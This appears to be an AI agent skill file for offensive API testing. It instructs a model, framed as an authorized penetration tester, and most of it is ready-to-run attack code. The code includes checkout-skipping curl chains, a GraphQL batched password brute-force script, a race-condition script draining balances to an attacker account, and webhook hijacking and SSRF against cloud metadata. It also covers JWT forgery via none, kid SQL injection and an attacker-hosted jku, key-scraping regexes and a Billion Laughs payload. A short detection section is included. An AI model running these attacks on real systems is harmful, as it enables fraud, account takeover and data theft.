---
name: offensive-api-abuse
description: "Advanced API exploitation methodology focused on business logic abuse and sophisticated attack patterns that bypass traditional security controls. Covers business logic bypass through API call chaining and workflow manipulation. Addresses GraphQL-specific attacks including batching for credential brute-force, query depth exploitation, and introspection abuse. Includes pagination exploitation for data exfiltration, webhook hijacking for SSRF and data interception, and resource exhaustion through algorithmic complexity attacks. Covers race conditions in API transactions using parallel request techniques. Provides comprehensive JWT manipulation including algorithm confusion, kid injection, jku/x5u abuse, and claim tampering. Details API key leakage detection across source repositories, client-side code, and error messages. Covers undocumented endpoint discovery through predictable naming, debug routes, and source map analysis. Tooling includes Arjun, ParamSpider, jwt_tool, and GraphQL Voyager. Designed for authorized penetration testers targeting business logic layers that automated scanners miss."
---

# Offensive API Abuse and Advanced Exploitation

You are conducting authorized security assessments targeting the business logic layer of API-driven applications. Traditional vulnerability scanners miss the attack patterns in this skill because they require understanding of application workflows, state transitions, and trust relationships between API endpoints. Your goal is to identify vulnerabilities that allow financial manipulation, data exfiltration through legitimate channels, privilege escalation via workflow abuse, and service disruption through logic-layer attacks.

## Quick Workflow

1. Map the complete API surface including undocumented endpoints using Arjun, ParamSpider, and manual discovery.
2. Model the business workflows: identify multi-step transactions, state machines, and trust chains between endpoints.
3. Test each workflow for race conditions using parallel request techniques.
4. Extract and analyze JWTs for algorithm confusion, weak signing, and claim injection opportunities.
5. If GraphQL is present, test batching for brute-force amplification, query depth for DoS, and introspection for schema leakage.
6. Probe pagination for data enumeration and exfiltration opportunities.
7. Test webhook configurations for SSRF and callback hijacking.
8. Search for API key leakage in client code, error responses, and public repositories.
9. Verify all discovered endpoints for authorization consistency.
10. Document business impact for each finding with financial or operational consequence estimates.

---

## Business Logic Bypass via API Chaining

Business logic vulnerabilities emerge when individual API endpoints are secure in isolation but the workflow connecting them has exploitable gaps. You identify these by mapping the intended transaction flow and then deviating from it.

```bash
# E-commerce checkout bypass
# Normal flow: add_to_cart -> apply_coupon -> calculate_total -> pay -> confirm
# Attack: skip payment and go directly to confirm

curl -s -X POST -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"product_id": "PROD-001", "quantity": 1}' \
  "https://target.example.com/api/v1/cart/items" | jq .

curl -s -X POST -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"coupon_code": "SAVE20"}' \
  "https://target.example.com/api/v1/cart/coupon" | jq .

# Skip payment -- attempt direct order confirmation
curl -s -X POST -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"cart_id": "CART-12345"}' \
  "https://target.example.com/api/v1/orders/confirm" | jq .
```

```bash
# Price manipulation: add expensive item for free shipping, calculate, remove it
curl -s -X POST -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"product_id": "EXPENSIVE-001", "quantity": 1}' \
  "https://target.example.com/api/v1/cart/items"

curl -s -X POST -H "Authorization: Bearer $TOKEN" \
  "https://target.example.com/api/v1/cart/calculate"

curl -s -X DELETE -H "Authorization: Bearer $TOKEN" \
  "https://target.example.com/api/v1/cart/items/EXPENSIVE-001"

curl -s -X POST -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"payment_method": "card_on_file"}' \
  "https://target.example.com/api/v1/cart/pay"
```

```bash
# State manipulation, negative quantities, currency confusion
curl -s -X PATCH -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"status": "pending"}' \
  "https://target.example.com/api/v1/orders/ORD-5001"

curl -s -X POST -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"product_id": "PROD-001", "quantity": -1}' \
  "https://target.example.com/api/v1/cart/items"

curl -s -X POST -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"amount": 100, "currency": "IDR"}' \
  "https://target.example.com/api/v1/payments"
```

---

## GraphQL Batching and Abuse

GraphQL APIs introduce unique attack surfaces through query batching, introspection, and nested query execution that bypass rate limiting and authorization controls.

```bash
# Full introspection query -- extract types and mutations
curl -s -X POST -H "Content-Type: application/json" \
  -H "Authorization: Bearer $TOKEN" \
  -d '{"query": "{ __schema { types { name kind fields { name type { name kind ofType { name } } } } } }"}' \
  "https://target.example.com/graphql" | jq '.data.__schema.types[] | select(.kind == "OBJECT")'

curl -s -X POST -H "Content-Type: application/json" \
  -H "Authorization: Bearer $TOKEN" \
  -d '{"query": "{ __schema { mutationType { fields { name args { name type { name kind } } } } } }"}' \
  "https://target.example.com/graphql" | jq '.data.__schema.mutationType.fields[].name'
```

Batching for brute-force amplification -- send multiple authentication attempts in a single HTTP request to bypass per-request rate limiting:

```python
#!/usr/bin/env python3
"""GraphQL batching for authentication brute-force amplification."""
import requests, json, sys

TARGET = "https://target.example.com/graphql"
BATCH_SIZE = 50

def run_batch_brute(email, wordlist_path):
    with open(wordlist_path) as f:
        passwords = [line.strip() for line in f if line.strip()]

    for i in range(0, len(passwords), BATCH_SIZE):
        batch = passwords[i:i + BATCH_SIZE]
        payload = [
            {"query": f'mutation a{j} {{ login(email: "{email}", password: "{pwd}") {{ token success }} }}'}
            for j, pwd in enumerate(batch)
        ]
        resp = requests.post(TARGET, json=payload, headers={"Content-Type": "application/json"})
        if resp.status_code == 429:
            print(f"[!] Rate limited at batch index {i}")
            break
        for j, result in enumerate(resp.json()):
            if result.get("data", {}).get("login", {}).get("success"):
                print(f"[+] Valid: {email}:{batch[j]}")
                return
        print(f"  Batch {i // BATCH_SIZE + 1}: {len(batch)} attempts in 1 request")

if __name__ == "__main__":
    run_batch_brute(sys.argv[1], sys.argv[2])
```

```bash
# Query depth exploitation for denial of service
curl -s -X POST -H "Content-Type: application/json" \
  -H "Authorization: Bearer $TOKEN" \
  -d '{"query": "{ users { posts { comments { author { posts { comments { author { posts { comments { author { name } } } } } } } } } } }"}' \
  "https://target.example.com/graphql"

# Field duplication for response amplification
curl -s -X POST -H "Content-Type: application/json" \
  -H "Authorization: Bearer $TOKEN" \
  -d '{"query": "{ a1: users { name email } a2: users { name email } a3: users { name email } a4: users { name email } a5: users { name email } a6: users { name email } a7: users { name email } a8: users { name email } a9: users { name email } a10: users { name email } }"}' \
  "https://target.example.com/graphql"
```

---

## Pagination Exploitation

Pagination mechanisms can leak total record counts, expose data through cursor manipulation, and allow complete database enumeration when not properly constrained.

```bash
# Probe pagination boundaries and abuse page size
curl -s -H "Authorization: Bearer $TOKEN" \
  "https://target.example.com/api/v1/users?page=1&per_page=1" | \
  jq '{total: .total, total_pages: .total_pages, current_page: .page}'

curl -s -H "Authorization: Bearer $TOKEN" \
  "https://target.example.com/api/v1/users?page=1&per_page=999999" | jq 'length'

curl -s -H "Authorization: Bearer $TOKEN" \
  "https://target.example.com/api/v1/users?page=-1&per_page=100" | jq .
```

```bash
# Cursor-based pagination manipulation
echo "eyJpZCI6MTAwMX0=" | base64 -d  # Decode cursor: {"id":1001}

# Forge a cursor to access arbitrary records
forged_cursor=$(echo -n '{"id":1}' | base64 -w0)
curl -s -H "Authorization: Bearer $TOKEN" \
  "https://target.example.com/api/v1/users?cursor=${forged_cursor}&limit=100" | jq .

# Sort and filter parameter injection
curl -s -H "Authorization: Bearer $TOKEN" \
  "https://target.example.com/api/v1/users?sort=password&order=asc" | jq .
curl -s -H "Authorization: Bearer $TOKEN" \
  "https://target.example.com/api/v1/users?filter[role]=admin" | jq .
```

---

## Webhook Hijacking and SSRF

Webhook configurations allow you to redirect server-initiated callbacks to attacker-controlled endpoints, enabling data interception and SSRF.

```bash
# Register a webhook pointing to your controlled server
curl -s -X POST -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{
    "url": "https://attacker-listener.example.com/webhook",
    "events": ["user.created", "order.completed", "payment.received"],
    "secret": "attacker_secret"
  }' "https://target.example.com/api/v1/webhooks" | jq .

# List existing webhooks to discover internal URLs
curl -s -H "Authorization: Bearer $TOKEN" \
  "https://target.example.com/api/v1/webhooks" | jq '.[] | {id, url, events}'
```

```bash
# Webhook SSRF: point webhook URL to internal services
internal_targets=(
  "http://127.0.0.1:8080/admin"
  "http://169.254.169.254/latest/meta-data/"
  "http://internal-api.local:3000/health"
  "http://elasticsearch.internal:9200/_cat/indices"
)

for target_url in "${internal_targets[@]}"; do
  resp=$(curl -s -X POST -H "Authorization: Bearer $TOKEN" \
    -H "Content-Type: application/json" \
    -d "{\"url\": \"${target_url}\", \"events\": [\"test.ping\"]}" \
    "https://target.example.com/api/v1/webhooks")
  echo "Target: ${target_url} -> $(echo "$resp" | head -c 200)"
done
```

---

## Race Conditions in API Transactions

Race conditions occur when APIs fail to properly serialize concurrent requests against shared state. You exploit these to duplicate transactions, bypass limits, or corrupt state.

```python
#!/usr/bin/env python3
"""Race condition testing for API transaction abuse."""
import asyncio, aiohttp

TARGET = "https://target.example.com/api/v1"
TOKEN = "YOUR_TOKEN"
HEADERS = {"Authorization": f"Bearer {TOKEN}", "Content-Type": "application/json"}

async def send_request(session, url, data=None):
    async with session.post(url, json=data, headers=HEADERS) as resp:
        body = await resp.json()
        return {"status": resp.status, "body": body}

async def race_coupon_redeem(coupon_code, n=20):
    """Redeem a single-use coupon multiple times via race condition."""
    async with aiohttp.ClientSession() as session:
        tasks = [send_request(session, f"{TARGET}/cart/coupon",
                              {"coupon_code": coupon_code}) for _ in range(n)]
        results = await asyncio.gather(*tasks)
        successes = [r for r in results if r["status"] == 200]
        print(f"[+] Coupon '{coupon_code}' redeemed {len(successes)}/{n} times")

async def race_balance_transfer(n=20):
    """Drain account by sending parallel transfers exceeding balance."""
    async with aiohttp.ClientSession() as session:
        tasks = [send_request(session, f"{TARGET}/transfers",
                              {"to_account": "ATTACKER-ACCT", "amount": 100, "currency": "USD"})
                 for _ in range(n)]
        results = await asyncio.gather(*tasks)
        successes = [r for r in results if r["status"] in (200, 201)]
        total = sum(r["body"].get("amount", 0) for r in successes)
        print(f"[+] Transfers succeeded: {len(successes)}/{n}, total: {total}")

if __name__ == "__main__":
    asyncio.run(race_coupon_redeem("SINGLE-USE-COUPON"))
    asyncio.run(race_balance_transfer())
```

```bash
# Race condition using GNU parallel with curl
seq 1 20 | parallel -j 20 'curl -s -o /dev/null -w "Request {}: %{http_code}\n" \
  -X POST -H "Authorization: Bearer '"$TOKEN"'" \
  -H "Content-Type: application/json" \
  -d '\''{"coupon_code": "SINGLE-USE"}'\'' \
  "https://target.example.com/api/v1/cart/coupon"'
```

---

## JWT Manipulation

JSON Web Tokens often carry authorization decisions client-side. You exploit weaknesses in token generation, validation, and cryptographic implementation.

```bash
# Decode, algorithm confusion (RS256 -> HS256), and none-algorithm attacks
jwt_tool "$JWT_TOKEN"
jwt_tool "$JWT_TOKEN" -X a  # Algorithm confusion
jwt_tool "$JWT_TOKEN" -X n  # None algorithm

# Manual none-algorithm variants
for alg in "none" "None" "NONE" "nOnE"; do
  header=$(echo -n "{\"alg\":\"${alg}\",\"typ\":\"JWT\"}" | base64 -w0 | tr '+/' '-_' | tr -d '=')
  payload=$(echo "$JWT_TOKEN" | cut -d. -f2)
  forged="${header}.${payload}."
  code=$(curl -s -o /dev/null -w "%{http_code}" \
    -H "Authorization: Bearer ${forged}" \
    "https://target.example.com/api/v1/users/me")
  echo "Algorithm '${alg}' -> HTTP ${code}"
done
```

```bash
# kid (Key ID) injection -- path traversal and SQL injection
jwt_tool "$JWT_TOKEN" -I -hc kid -hv "../../dev/null" -S hs256 -p ""
jwt_tool "$JWT_TOKEN" -I -hc kid -hv "/proc/sys/kernel/hostname" -S hs256 -p ""
jwt_tool "$JWT_TOKEN" -I -hc kid -hv "' UNION SELECT 'attacker_secret' -- " -S hs256 -p "attacker_secret"
```

```bash
# jku (JWK Set URL) abuse: generate keypair, host JWKS, forge token
openssl genrsa -out attacker_key.pem 2048
openssl rsa -in attacker_key.pem -pubout -out attacker_pub.pem

python3 -c "
import json, base64
from cryptography.hazmat.primitives.serialization import load_pem_public_key
with open('attacker_pub.pem', 'rb') as f:
    pub = load_pem_public_key(f.read())
n = pub.public_numbers()
jwks = {'keys': [{'kty': 'RSA', 'kid': 'attacker-key-1', 'use': 'sig',
    'n': base64.urlsafe_b64encode(n.n.to_bytes(256, 'big')).rstrip(b'=').decode(),
    'e': base64.urlsafe_b64encode(n.e.to_bytes(3, 'big')).rstrip(b'=').decode()}]}
print(json.dumps(jwks, indent=2))
" > jwks.json

jwt_tool "$JWT_TOKEN" -I \
  -hc jku -hv "https://attacker.example.com/.well-known/jwks.json" \
  -hc kid -hv "attacker-key-1" \
  -S rs256 -pr attacker_key.pem
```

```bash
# Claim tampering with a known or brute-forced secret
jwt_tool "$JWT_TOKEN" -I -pc role -pv admin -S hs256 -p "$KNOWN_SECRET"
jwt_tool "$JWT_TOKEN" -I -pc sub -pv "admin@target.com" -S hs256 -p "$KNOWN_SECRET"
jwt_tool "$JWT_TOKEN" -I -pc exp -pv 9999999999 -S hs256 -p "$KNOWN_SECRET"
jwt_tool "$JWT_TOKEN" -I -pc is_admin -pv true \
  -pc permissions -pv '["admin","superuser"]' -S hs256 -p "$KNOWN_SECRET"
```

---

## API Key Leakage Patterns

API keys leak through predictable channels. You systematically search for them across all exposure surfaces.

```bash
# Search public repositories for leaked keys
gh api search/code -q '.items[] | {repo: .repository.full_name, path: .path}' \
  --method GET -f "q=org:target-org api_key OR apikey OR api-key OR secret_key"

gh api search/code -q '.items[] | {repo: .repository.full_name, path: .path, url: .html_url}' \
  --method GET -f "q=org:target-org AKIA OR sk_live OR rk_live"
```

```bash
# Client-side key extraction from JavaScript bundles
curl -s "https://target.example.com/" | \
  grep -oE 'src="[^"]*\.js[^"]*"' | sed 's/src="//;s/"//' | while read -r js_url; do
    echo "=== Scanning: https://target.example.com${js_url} ==="
    curl -s "https://target.example.com${js_url}" | grep -oiE \
      '(api[_-]?key|api[_-]?secret|access[_-]?token|secret[_-]?key)["\x27]?\s*[:=]\s*["\x27][A-Za-z0-9+/=_-]{16,}["\x27]'
done

# Error message key leakage
curl -s -X POST -H "Content-Type: application/json" \
  -d '{"invalid": true}' "https://target.example.com/api/v1/connect" | \
  grep -iE '(key|token|secret|password|credential)'
```

---

## Undocumented Endpoint Discovery

Production APIs frequently expose endpoints not listed in public documentation. You discover them through predictable naming patterns, debug routes, and application source analysis.

```bash
# Parameter discovery with Arjun
arjun -u "https://target.example.com/api/v1/users" -m GET \
  --headers "Authorization: Bearer $TOKEN" -t 10
arjun -u "https://target.example.com/api/v1/users" -m POST \
  --headers "Authorization: Bearer $TOKEN" -t 10

# ParamSpider for URL parameter mining from web archives
paramspider -d target.example.com --exclude woff,css,js,png,svg,jpg,gif
```

```bash
# Endpoint brute-forcing with predictable naming patterns
wordlist=(
  "internal" "debug" "test" "dev" "staging" "beta"
  "admin" "manage" "console" "dashboard" "config"
  "health" "status" "metrics" "graphql" "playground"
  "backup" "export" "import" "batch" "bulk" "webhook"
)

for word in "${wordlist[@]}"; do
  for prefix in "/api/v1" "/api/v2" "/api/internal" "/api" "/_"; do
    code=$(curl -s -o /dev/null -w "%{http_code}" \
      -H "Authorization: Bearer $TOKEN" \
      "${TARGET}${prefix}/${word}")
    [ "$code" != "404" ] && [ "$code" != "000" ] && echo "[${code}] ${prefix}/${word}"
  done
done

# Extract API routes from JavaScript bundles
curl -s "https://target.example.com/static/js/main.js" | \
  grep -oE '["'\'']/api/[a-zA-Z0-9/_-]+["'\'']' | sort -u
```

---

## Resource Exhaustion and Algorithmic Complexity

Target API operations that have disproportionate server-side cost relative to request complexity.

```bash
# ReDoS via search parameters -- measure response time scaling
for len in 10 20 30 40 50; do
  payload=$(python3 -c "print('a' * ${len} + '!')")
  curl -s -o /dev/null -w "Length ${len}: %{time_total}s\n" \
    -H "Authorization: Bearer $TOKEN" \
    "https://target.example.com/api/v1/search?q=${payload}"
done

# XML entity expansion (Billion Laughs) if XML input accepted
curl -s -X POST -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/xml" \
  -d '<?xml version="1.0"?>
<!DOCTYPE lolz [
  <!ENTITY lol "lol">
  <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
  <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
  <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
]>
<data>&lol4;</data>' "https://target.example.com/api/v1/import"
```

---

## Detection / Defender View

When you execute these techniques, you generate specific artifacts that defenders monitor for:

- **Business logic abuse** does not trigger signature-based detection because each individual request is valid. Behavioral analytics detect deviations such as checkout steps executed out of order, coupon codes applied in parallel, or state transitions that violate the application state machine. Transaction monitoring flags duplicate rewards, negative-amount transfers, or currency mismatches.

- **GraphQL batching** produces abnormally large request payloads. API gateways with query complexity, depth, or operation count limits block these. Introspection queries from non-development sources trigger alerts.

- **Pagination abuse** manifests as requests with abnormal page sizes or sequential fetches at high volume. DLP systems alert on bulk data access patterns.

- **Webhook manipulation** is detected by registration audit logs. Outbound connection monitoring flags callbacks to unexpected destinations. SSRF defenses validate callback URLs against allowlists.

- **Race conditions** produce bursts of identical requests within millisecond windows. Distributed tracing captures concurrent state modifications. Database logs show serialization failures.

- **JWT attacks** involving algorithm confusion produce tokens with unexpected header values logged by auth middleware. Tokens with jku/x5u pointing to external URLs trigger URL validation alerts.

- **Endpoint enumeration** produces 404 bursts and unusual URL path patterns. WAFs flag path traversal patterns in discovery attempts.

---

## Engagement Cheatsheet

| Phase | Action | Tool |
|-------|--------|------|
| Discovery | Hidden parameter enumeration | Arjun |
| Discovery | URL parameter mining | ParamSpider |
| Discovery | GraphQL schema introspection | curl, GraphQL Voyager |
| Discovery | Endpoint brute-force | Custom wordlist scripts |
| Logic | Workflow bypass via API chaining | curl, Burp Repeater |
| Logic | Price/state manipulation | curl sequences |
| Logic | Race condition exploitation | Python asyncio/aiohttp, GNU parallel |
| Auth | JWT algorithm confusion | jwt_tool |
| Auth | JWT kid/jku injection | jwt_tool, openssl |
| Auth | JWT claim tampering | jwt_tool |
| Data | Pagination-based exfiltration | curl, Python scripts |
| Data | GraphQL batched brute-force | Python scripts |
| Data | API key leakage search | gh, grep, curl |
| Infra | Webhook hijacking/SSRF | curl |
| Infra | Resource exhaustion | curl, Python |

---

## Key References

- OWASP API Security Top 10 2023: https://owasp.org/API-Security/editions/2023/en/0x11-t10/
- OWASP Testing Guide -- Business Logic Testing: https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/10-Business_Logic_Testing/
- GraphQL Security Best Practices: https://graphql.org/learn/security/
- PortSwigger -- Race Conditions: https://portswigger.net/web-security/race-conditions
- jwt_tool: https://github.com/ticarpi/jwt_tool
- Arjun: https://github.com/s0md3v/Arjun
- ParamSpider: https://github.com/devanshbatham/ParamSpider
- GraphQL Voyager: https://github.com/graphql-kit/graphql-voyager
- "Black Hat GraphQL" by Nick Aleks and Dolev Farhi (No Starch Press)
- RFC 7519 -- JSON Web Token: https://datatracker.ietf.org/doc/html/rfc7519
